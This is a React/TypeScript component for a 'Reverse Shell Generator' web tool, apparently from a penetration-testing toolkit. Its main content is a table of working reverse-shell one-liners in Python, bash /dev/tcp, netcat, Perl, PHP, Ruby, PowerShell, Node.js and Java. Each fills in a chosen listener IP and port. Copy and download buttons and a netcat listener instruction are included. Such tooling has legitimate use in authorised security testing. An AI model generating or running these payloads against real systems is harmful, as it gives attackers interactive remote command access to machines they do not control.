'use client';

import { useState, useMemo } from 'react';
import { Terminal, Copy, Check, Download } from 'lucide-react';
import { motion } from 'framer-motion';

const shellTemplates: Record<string, (host: string, port: string) => string> = {
  python: (host, port) => `import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("${host}",${port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])`,
  
  python3: (host, port) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
  
  bash: (host, port) => `bash -i >& /dev/tcp/${host}/${port} 0>&1`,
  
  netcat: (host, port) => `nc -e /bin/sh ${host} ${port}`,
  
  perl: (host, port) => `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  
  php: (host, port) => `php -r '$sock=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  
  ruby: (host, port) => `ruby -rsocket -e'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  
  powershell: (host, port) => `$client = New-Object System.Net.Sockets.TCPClient("${host}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
  
  nodejs: (host, port) => `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${port},"${host}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()`,
  
  java: (host, port) => `r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${host}/${port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()`,
};

export default function ReverseShellGenerator() {
  const [host, setHost] = useState('');
  const [port, setPort] = useState('4444');
  const [selectedLanguage, setSelectedLanguage] = useState<string>('python');
  const [copied, setCopied] = useState(false);

  const generatedPayload = useMemo(() => {
    if (!host || !port) {
      return '';
    }

    const template = shellTemplates[selectedLanguage];
    if (template) {
      return template(host, port);
    }
    return '';
  }, [host, port, selectedLanguage]);

  const copyToClipboard = async () => {
    if (generatedPayload) {
      await navigator.clipboard.writeText(generatedPayload);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const downloadPayload = () => {
    if (!generatedPayload) return;
    
    const blob = new Blob([generatedPayload], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `reverse_shell_${selectedLanguage}.${getFileExtension(selectedLanguage)}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const getFileExtension = (lang: string): string => {
    const extensions: Record<string, string> = {
      python: 'py',
      python3: 'py',
      bash: 'sh',
      netcat: 'sh',
      perl: 'pl',
      php: 'php',
      ruby: 'rb',
      powershell: 'ps1',
      nodejs: 'js',
      java: 'java',
    };
    return extensions[lang] || 'txt';
  };


  return (
    <div className="relative glass-strong rounded-2xl p-6 backdrop-blur-strong border-2 border-purple-400/30 shadow-2xl overflow-hidden group hover:border-purple-400/50 transition-all duration-300">
      {/* Animated gradient background - Purple */}
      <div 
        className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-500"
        style={{
          background: 'linear-gradient(to bottom right, rgba(192, 132, 252, 0.1), transparent 50%, rgba(168, 85, 247, 0.05))',
        }}
      />
      <div 
        className="absolute inset-0"
        style={{
          background: 'radial-gradient(circle at 70% 20%, rgba(192, 132, 252, 0.15), transparent 50%)',
        }}
      />
      
      {/* Glow effect */}
      <div 
        className="absolute -inset-1 rounded-2xl opacity-0 group-hover:opacity-20 blur-xl transition-opacity duration-500"
        style={{
          background: 'linear-gradient(to right, rgb(192, 132, 252), rgb(168, 85, 247), rgb(147, 51, 234))',
        }}
      />

      <div className="relative z-10">
        {/* Header */}
        <div className="mb-6 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="relative">
              <div className="absolute inset-0 bg-purple-400 rounded-xl blur-lg opacity-50 animate-pulse" />
              <div className="relative p-2 rounded-xl bg-gradient-to-br from-purple-400/30 to-purple-400/10 border border-purple-400/50 shadow-lg">
                <Terminal className="w-5 h-5 text-purple-400" />
              </div>
            </div>
            <div>
              <h3 className="text-lg font-bold text-foreground mb-0.5" style={{
                textShadow: '0 0 15px rgba(192, 132, 252, 0.6)',
              }}>Reverse Shell Generator</h3>
              <p className="text-xs text-muted-foreground">
                Generate reverse shell payloads
              </p>
            </div>
          </div>
        </div>

        {/* Input Section */}
        <div className="space-y-3 mb-4">
          <div className="grid grid-cols-2 gap-2">
            <div>
              <label className="block text-xs font-medium text-foreground mb-1.5">
                Listener IP
              </label>
              <input
                type="text"
                value={host}
                onChange={(e) => setHost(e.target.value)}
                placeholder="192.168.1.100"
                className="w-full px-3 py-2 rounded-lg bg-dark-secondary border border-border/50 text-foreground text-sm focus:outline-none focus:ring-2 focus:ring-purple-400/50"
              />
            </div>
            <div>
              <label className="block text-xs font-medium text-foreground mb-1.5">
                Port
              </label>
              <input
                type="number"
                value={port}
                onChange={(e) => setPort(e.target.value)}
                placeholder="4444"
                className="w-full px-3 py-2 rounded-lg bg-dark-secondary border border-border/50 text-foreground text-sm focus:outline-none focus:ring-2 focus:ring-purple-400/50"
              />
            </div>
          </div>

          <div>
            <label className="block text-xs font-medium text-foreground mb-1.5">
              Language
            </label>
            <select
              value={selectedLanguage}
              onChange={(e) => setSelectedLanguage(e.target.value)}
              className="w-full px-3 py-2 rounded-lg bg-dark-secondary border border-border/50 text-foreground text-sm focus:outline-none focus:ring-2 focus:ring-purple-400/50"
            >
              {Object.keys(shellTemplates).map((lang) => (
                <option key={lang} value={lang}>
                  {lang.charAt(0).toUpperCase() + lang.slice(1)}
                </option>
              ))}
            </select>
          </div>
        </div>

        {/* Generated Payload */}
        {generatedPayload && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-2"
          >
            <div className="flex items-center justify-between">
              <label className="text-xs font-medium text-foreground">
                Generated Payload
              </label>
              <div className="flex items-center gap-2">
                <button
                  onClick={copyToClipboard}
                  className="p-1.5 rounded-lg bg-purple-400/20 hover:bg-purple-400/30 border border-purple-400/50 text-purple-400 transition-colors"
                  title="Copy to clipboard"
                >
                  {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                </button>
                <button
                  onClick={downloadPayload}
                  className="p-1.5 rounded-lg bg-purple-400/20 hover:bg-purple-400/30 border border-purple-400/50 text-purple-400 transition-colors"
                  title="Download payload"
                >
                  <Download className="w-3 h-3" />
                </button>
              </div>
            </div>
            <div className="p-3 rounded-lg bg-dark-secondary/80 border border-border/30">
              <pre className="text-xs text-foreground font-mono overflow-x-auto whitespace-pre-wrap break-all">
                {generatedPayload}
              </pre>
            </div>
          </motion.div>
        )}

        {/* Instructions */}
        <div className="mt-4 p-3 rounded-lg bg-muted/20 border border-border/20">
          <p className="text-xs text-muted-foreground">
            <strong className="text-foreground">Usage:</strong> Start a listener on your machine first:
            <code className="block mt-1 p-2 rounded bg-dark-secondary text-xs">nc -lvp {port}</code>
          </p>
        </div>
      </div>
    </div>
  );
}

